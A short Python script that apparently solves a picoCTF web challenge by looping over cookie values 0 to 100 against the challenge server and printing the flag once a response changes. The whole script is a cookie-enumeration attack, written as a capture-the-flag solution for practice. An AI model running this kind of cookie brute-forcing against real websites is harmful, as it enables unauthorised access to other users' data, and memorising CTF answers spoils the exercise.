import requests
import re

def main():
    url = "http://mercury.picoctf.net:27177/check"
    for i in range(0,101):
        cookie = {'name':str(i)}
        r = requests.get(url,cookies=cookie)
        if "That is a cookie!" not in r.text:
            flag = flag = re.findall(r'picoCTF{.*?}', r.text)[0]
            print (flag)
            break
main()